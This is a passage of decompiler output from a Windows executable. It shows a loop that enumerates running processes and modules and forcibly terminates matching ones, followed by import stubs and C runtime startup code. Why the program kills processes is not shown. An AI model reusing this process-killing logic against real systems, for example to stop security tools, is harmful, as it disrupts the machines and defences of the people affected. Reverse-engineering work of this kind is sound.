          pcVar11 = (char *)((byte *)pcVar11 + 2);
        } while (bVar2 != 0);
        iVar7 = 0;
LAB_00401846:
        if (iVar7 == 0) {
          pvVar6 = OpenProcess(0x1f0fff,1,(DWORD)appppppuStack_458);
          TerminateProcess(pvVar6,0);
        }
      }
    }
    iVar7 = Module32Next(uVar16,auStack_244);
    unaff_ESI = appppppuStack_458;
  } while( true );
}



void Module32Next(void)

{
                    // WARNING: Could not recover jumptable at 0x00401890. Too many branches
                    // WARNING: Treating indirect jump as call
  Module32Next();
  return;
}



void Module32First(void)

{
                    // WARNING: Could not recover jumptable at 0x00401896. Too many branches
                    // WARNING: Treating indirect jump as call
  Module32First();
  return;
}



void Process32Next(void)

{
                    // WARNING: Could not recover jumptable at 0x0040189c. Too many branches
                    // WARNING: Treating indirect jump as call
  Process32Next();
  return;
}



void Process32First(void)

{
                    // WARNING: Could not recover jumptable at 0x004018a2. Too many branches
                    // WARNING: Treating indirect jump as call
  Process32First();
  return;
}



void CreateToolhelp32Snapshot(void)

{
                    // WARNING: Could not recover jumptable at 0x004018a8. Too many branches
                    // WARNING: Treating indirect jump as call
  CreateToolhelp32Snapshot();
  return;
}



char * __cdecl strrchr(char *_Str,int _Ch)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x004018ae. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strrchr(_Str,_Ch);
  return pcVar1;
}



int __cdecl strncmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004018b4. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = strncmp(_Str1,_Str2,_MaxCount);
  return iVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  undefined4 *puVar1;
  byte *pbVar2;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  void *pvStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_00402090;
  puStack_10 = &DAT_00401a40;
  pvStack_14 = ExceptionList;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  ExceptionList = &pvStack_14;
  __set_app_type(2);
  _DAT_004030fc = 0xffffffff;
  _DAT_00403100 = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_004030f8;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_004030f4;
  _DAT_00403104 = *(undefined4 *)_adjust_fdiv_exref;
  FUN_00401a39();
  if (DAT_004030c4 == 0) {
    __setusermatherr(&LAB_00401a36);
  }
  FUN_00401a24();
  _initterm(&DAT_00403008,&DAT_0040300c);
  local_70.newmode = DAT_004030f0;
  __getmainargs(&local_64,&local_74,&local_68,DAT_004030ec,&local_70);
  _initterm(&DAT_00403000,&DAT_00403004);
  pbVar2 = *(byte **)_acmdln_exref;
  if (*pbVar2 != 0x22) {
    do {
      if (*pbVar2 < 0x21) goto LAB_004019ad;
      pbVar2 = pbVar2 + 1;
    } while( true );
  }
  do {
    pbVar2 = pbVar2 + 1;
    if (*pbVar2 == 0) break;
  } while (*pbVar2 != 0x22);
  if (*pbVar2 != 0x22) goto LAB_004019ad;
  do {
    pbVar2 = pbVar2 + 1;
LAB_004019ad:
  } while ((*pbVar2 != 0) && (*pbVar2 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  GetModuleHandleA((LPCSTR)0x0);
  local_6c = FUN_004014d0();
                    // WARNING: Subroutine does not return
  exit(local_6c);
}



void FUN_00401a18(void)

{
                    // WARNING: Treating indirect jump as call
  (*(code *)0x22fa)();
  return;
}



void _initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x00401a1e. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm();
  return;
}



void FUN_00401a24(void)

{
  _controlfp(0x10000,0x30000);
  return;
}



void FUN_00401a39(void)

{
  return;
}



uint __cdecl _controlfp(uint _NewValue,uint _Mask)

{
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401a46. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _controlfp(_NewValue,_Mask);
  return uVar1;
}


